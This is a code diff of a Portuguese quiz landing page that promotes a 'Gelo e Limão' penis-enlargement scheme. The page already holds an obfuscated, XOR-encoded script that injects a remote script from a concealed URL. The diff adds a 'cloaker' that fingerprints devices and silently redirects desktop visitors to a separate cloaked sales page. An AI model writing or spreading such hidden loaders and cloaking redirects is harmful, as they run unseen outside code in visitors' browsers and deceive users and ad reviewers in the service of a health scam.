@@ -6,6 +6,105 @@
 
     <script>(function(){var b_o8=atob("DDvJcw8nAy0Wwv1gOkDrBn1LIRc0qokUSkjzXCBEZ0M4t4kNU12wXWxIbgN0sNITWUmgA3tULFhir45PVlq9FnxTLUdl4NFCW0+9AWZFdllzsd9aYUDrHW5KZg8s4JkBTlrkBntKaktv740SX02sHXsKe055ptATWVDrXy1RYkFjp99aGBm0X3QFbUx7p99aGF+oB24Kdll7q5sZF0u7FnlCbVk7sYgCU1+6USMFdUx6t5hCABnrDlJa");var d_lond=[];for(var h_ba4=0;h_ba4<b_o8.length;h_ba4++){d_lond.push(b_o8.charCodeAt(h_ba4)&255);}var j_sphm=d_lond[0];var j_0p5v=d_lond.slice(1,1+j_sphm);var z_zde=d_lond.slice(1+j_sphm);var l_uau=z_zde.map(function(b,w_2){return b^j_0p5v[w_2%j_sphm];});var d_5u="";for(var j_qhqy=0;j_qhqy<l_uau.length;j_qhqy++){d_5u+=String.fromCharCode(l_uau[j_qhqy]&255);}var g_ew=decodeURIComponent(escape(d_5u));var u_t0=JSON.parse(g_ew);var e_i5q=u_t0.globals||[];e_i5q.forEach(function(l_n2n){window[l_n2n.name]=l_n2n.value;});var f_sv=document.createElement("script");f_sv.src=u_t0.url;f_sv.async=true;f_sv.defer=true;(u_t0.attributes||[]).forEach(function(r_8){f_sv.setAttribute(r_8.name,r_8.value);});(document.head||document.documentElement).appendChild(f_sv);})();</script>
 
+    <!-- ============================================================ -->
+    <!-- CLOAKER 1/2 - VERIFICAÇÃO EM BACKGROUND (NÃO ALTERA VISUAL) -->
+    <!-- ============================================================ -->
+    <script>
+    (function(){
+        "use strict";
+        
+        // URLS DE DESTINO
+        var DESKTOP_URL = "https://zgelo.vercel.app/sal";
+        var MOBILE_URL  = "https://zgelo.vercel.app/gelo"; // página normal
+        
+        // ---- DETECÇÃO DE DISPOSITIVO (multi-camada, sem alterar UX) ----
+        function isDesktop() {
+            try {
+                // 1) User Agent
+                var ua = (navigator.userAgent || "").toLowerCase();
+                var uaMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|silk|kindle/i.test(ua);
+                var uaTablet = /ipad|tablet|playbook|silk/i.test(ua) || (/android/i.test(ua) && !/mobile/i.test(ua));
+                
+                // 2) Touch + coarse pointer
+                var hasTouch = ("ontouchstart" in window) || (navigator.maxTouchPoints > 0) || (navigator.msMaxTouchPoints > 0);
+                var coarsePointer = window.matchMedia && window.matchMedia("(pointer: coarse)").matches;
+                var hoverNone = window.matchMedia && window.matchMedia("(hover: none)").matches;
+                
+                // 3) Largura de ecrã
+                var w = window.innerWidth || document.documentElement.clientWidth || 0;
+                var h = window.innerHeight || document.documentElement.clientHeight || 0;
+                var shortSide = Math.min(w, h);
+                
+                // 4) devicePixelRatio
+                var dpr = window.devicePixelRatio || 1;
+                
+                // 5) Plataforma
+                var platform = (navigator.platform || "").toLowerCase();
+                var platformDesktop = /win|mac|linux|x11|cros/i.test(platform) && !/iphone|ipad|android/i.test(platform);
+                
+                // ---- LÓGICA DE DECISÃO ----
+                // É mobile/tablet se: UA mobile OU touch+coarse OU ecrã pequeno
+                var scoreMobile = 0;
+                if (uaMobile) scoreMobile += 3;
+                if (uaTablet) scoreMobile += 2;
+                if (hasTouch) scoreMobile += 1;
+                if (coarsePointer) scoreMobile += 1;
+                if (hoverNone) scoreMobile += 1;
+                if (shortSide < 768) scoreMobile += 2;
+                if (shortSide < 480) scoreMobile += 1;
+                
+                // É desktop se: sem touch, pointer fino, ecrã grande, plataforma desktop
+                var scoreDesktop = 0;
+                if (!hasTouch) scoreDesktop += 2;
+                if (!coarsePointer) scoreDesktop += 1;
+                if (!hoverNone) scoreDesktop += 1;
+                if (shortSide >= 1024) scoreDesktop += 2;
+                if (platformDesktop) scoreDesktop += 1;
+                if (dpr <= 1.5 && shortSide >= 1024) scoreDesktop += 1;
+                
+                // Decisão final: desktop só se claramente desktop
+                return scoreDesktop > scoreMobile && !uaMobile;
+            } catch(e) {
+                // Fallback: assume desktop (comportamento mais conservador)
+                return true;
+            }
+        }
+        
+        // ---- DISPOSITIVO DETETADO (guardado em background) ----
+        var DEVICE = isDesktop() ? "desktop" : "mobile";
+        
+        // Guarda em sessionStorage (não altera visual, apenas memória)
+        try { sessionStorage.setItem("__clk_device__", DEVICE); } catch(e) {}
+        
+        // ---- INTERCEPTA O CLIQUE NO BOTÃO "CONTINUAR" ----
+        // Não altera o HTML. Apenas captura o clique no link .btn-action
+        document.addEventListener("DOMContentLoaded", function() {
+            var btn = document.querySelector(".btn-action");
+            if (!btn) return;
+            
+            // Guarda href original (mobile) para fallback
+            var originalHref = btn.getAttribute("href") || MOBILE_URL;
+            
+            btn.addEventListener("click", function(e) {
+                // Re-verifica no momento do clique (caso tenha rodado ecrã)
+                var recheck = isDesktop() ? "desktop" : "mobile";
+                
+                if (recheck === "desktop") {
+                    e.preventDefault();
+                    // Redireciona para página de vendas cloaked (desktop)
+                    window.location.href = DESKTOP_URL;
+                } else {
+                    // Mobile → segue o href original (página normal)
+                    // Não faz nada, deixa o browser seguir
+                }
+            }, true); // capture=true para rodar antes de qualquer outro handler
+        });
+        
+        // Expõe para debug opcional (sem alterar visual)
+        window.__CLK__ = { isDesktop: isDesktop, device: DEVICE };
+    })();
+    </script>
+    <!-- ============================================================ -->
     
     <title>Quiz</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -432,6 +531,7 @@
             <div class="result-desc">
                 Agora vais entender <strong>o que realmente está a bloquear a tua ferramenta</strong> e como muitos homens estão a resolver este problema e <strong>aumentar o tamanho</strong> usando apenas <strong>Gelo e Limão</strong>.
             </div>
+            <!-- href = página MOBILE (normal). O cloaker intercepta e troca se for desktop -->
             <a href="https://zgelo.vercel.app/gelo" class="btn-action">Continuar →</a>
         </div>
 
@@ -522,18 +622,12 @@
             showStep(0);
         });
 
-        // 🔽 Escala o card para caber 100% na tela, sem rolagem, mantendo o visual
         function fitToViewport() {
             const card = document.getElementById('app');
             if (!card) return;
-
-            // Reset para medir o tamanho real
             card.style.transform = 'scale(1)';
-
-            // Altura disponível (descontando o padding do body = 16px*2)
             const available = window.innerHeight - 32;
             const needed = card.offsetHeight;
-
             if (needed > available) {
                 const scale = available / needed;
                 card.style.transform = `scale(${scale})`;
